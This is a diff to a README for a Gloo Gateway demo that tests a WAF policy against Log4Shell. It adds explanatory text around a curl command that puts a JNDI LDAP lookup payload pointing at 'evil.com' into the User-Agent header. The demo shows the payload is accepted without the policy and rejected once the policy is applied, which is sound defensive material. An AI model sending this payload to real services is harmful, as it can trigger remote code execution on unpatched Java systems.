@@ -19,7 +19,9 @@ kubectl apply -f log4shell/virtual-gateway.yaml --context gloo
 kubectl apply -f log4shell/route-table.yaml --context gloo
 ```
 
-## Test bad call
+## Test Bad Call
+
+This call has a potentially malicious remote-access header passed in through the `User-Agent` header. If the responding service was a Java service using an unpatched version of Log4j, then we could be in real trouble. The call is accepted without intervention.
 
 ```sh
 curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything -i
@@ -30,6 +32,10 @@ curl -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" localhost:8080/anything 
 ```sh
 kubectl apply -f log4shell/waf-policy.yaml --context gloo
 ```
+
+## Re-test Bad Calls
+
+Now we have a WAF policy in place that blocks potentially malicious headers, request argument, and request payloads. Note that all of these "attacks" are now rejected by Gloo Gateway before they reach the upstream service.
 
 ```sh
 # Request Header Attacks
